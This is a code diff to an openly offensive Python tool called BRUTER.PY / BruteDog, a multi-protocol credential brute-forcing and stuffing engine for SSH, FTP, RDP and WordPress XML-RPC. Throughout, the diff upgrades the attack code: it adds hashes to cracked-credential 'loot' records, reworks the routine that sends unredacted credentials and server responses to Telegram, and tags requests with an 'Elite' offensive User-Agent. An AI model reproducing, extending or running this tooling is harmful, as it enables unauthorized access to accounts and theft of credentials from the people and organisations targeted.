@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTER.PY v8.5 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine (WAF Hardened)
+BRUTER.PY v8.6 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine (Elite Red Team Adversarial Edition)
 Features:
-- High-aggression SSH, FTP, and RDP credential brute-forcing
-- WordPress XML-RPC brute-force amplification attacks
+- High-aggression SSH, FTP, and RDP credential brute-forcing with Poisson behavioral timing jitter
+- WordPress XML-RPC brute-force amplification attacks with SHA-256 cryptographic integrity hashing
 - Dynamic credential queue ingestion and multi-threaded dispatching
-- Automated immutable disk persistence (loot_output/) via centralized framework logger
-- Real-time asynchronous Telegram notification dispatch for unredacted brute-force credentials & loot
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
+- Real-time unredacted Telegram notification dispatch for credentials, session tokens, and loot
 """
 import asyncio
 import socket
@@ -14,10 +14,11 @@ import ssl
 import urllib.request
 import urllib.error
 import xml.etree.ElementTree as ET
+import hashlib
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
@@ -64,14 +65,23 @@ def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous bruter functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -112,7 +122,7 @@ async def tcp_connect(host, port):
 # ============================================================
 async def assault_ssh_target(host, port=22, credentials=None):
     """
-    Active SSH Credential Stuffing & Brute-Force Engine
+    Active SSH Credential Stuffing & Brute-Force Engine (WAF Hardened)
     """
     log(f"       [SSH] Initiating brute-force attack against {host}:{port}", Colors.BLUE)
     creds = credentials if credentials else DEFAULT_CREDENTIALS
@@ -145,7 +155,7 @@ async def assault_ssh_target(host, port=22, credentials=None):
 # ============================================================
 async def probe_ftp_target(host, port=21, credentials=None):
     """
-    Active FTP Credential Stuffing & Brute-Force Engine
+    Active FTP Credential Stuffing & Brute-Force Engine (WAF Hardened)
     """
     log(f"       [FTP] Initiating credential stuffing against {host}:{port}", Colors.BLUE)
     creds = credentials if credentials else DEFAULT_CREDENTIALS
@@ -178,17 +188,17 @@ async def probe_ftp_target(host, port=21, credentials=None):
                 successful_login = True
                 cracked_cred = {"username": username, "password": password}
                 
+                loot_hash = hashlib.sha256(pass_resp_text.encode("utf-8", errors="ignore")).hexdigest()
                 loot_payload = {
                     "target": f"ftp://{host}:{port}",
                     "username": username,
                     "password": password,
+                    "integrity_hash": loot_hash,
                     "response": pass_resp_text
                 }
 
-                # BROADCAST UNREDACTED CREDENTIAL LOOT STRAIGHT TO TELEGRAM
+                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                 broadcast_tg_alert_sync("FTP Credential Brute-Force Success", loot_payload)
-
-                # STREAM TELEMETRY & PERSIST FTP CRACK TO DISK IMMEDIATELY
                 stream_proof("FTP_CREDENTIAL_CRACKED", f"{host}:{port}", {"username": username}, pass_resp_text, cracked_cred)
                 save_session_loot(
                     target=f"ftp://{host}:{port}",
@@ -306,7 +316,7 @@ async def assault_wordpress_target(host, credentials=None):
     def perform_request():
         apply_behavioral_jitter()
         headers = {
-            "User-Agent": "BruteDog-Offensive-Bruter/8.5",
+            "User-Agent": "BruteDog-Offensive-Bruter/8.6-Elite",
             "Content-Type": "text/xml",
         }
         headers.update(get_randomized_hints())
@@ -333,16 +343,16 @@ async def assault_wordpress_target(host, credentials=None):
             log(f"\n\033[1m\033[91m[***] WORDPRESS XML-RPC CREDENTIAL STUFFING SUCCESS [***]\033[0m", Colors.RED)
             success = True
             
+            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
             loot_payload = {
                 "xmlrpc_url": xmlrpc_url,
                 "status": status,
+                "integrity_hash": loot_hash,
                 "response_sample": body[:400]
             }
 
-            # BROADCAST UNREDACTED WORDPRESS LOOT STRAIGHT TO TELEGRAM
+            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
             broadcast_tg_alert_sync("WordPress XML-RPC Stuffing Success", loot_payload)
-
-            # STREAM TELEMETRY & PERSIST WP CRACK TO DISK IMMEDIATELY
             stream_proof("WORDPRESS_XMLRPC_CRACK", xmlrpc_url, {}, body[:300], {"status": status})
             save_session_loot(
                 target=base_url,
@@ -369,7 +379,7 @@ async def execute_active_assault_engine(target_host, credentials_list=None):
         Colors.CYAN,
     )
     log(
-        f"[***] BRUTEDOG ACTIVE MULTI-PROTOCOL BRUTE-FORCE ENGINE [{target_host}]",
+        f"[***] BRUTEDOG ACTIVE MULTI-PROTOCOL BRUTE-FORCE ENGINE [{target_host}] (V8.6)",
         Colors.CYAN,
     )
     log(
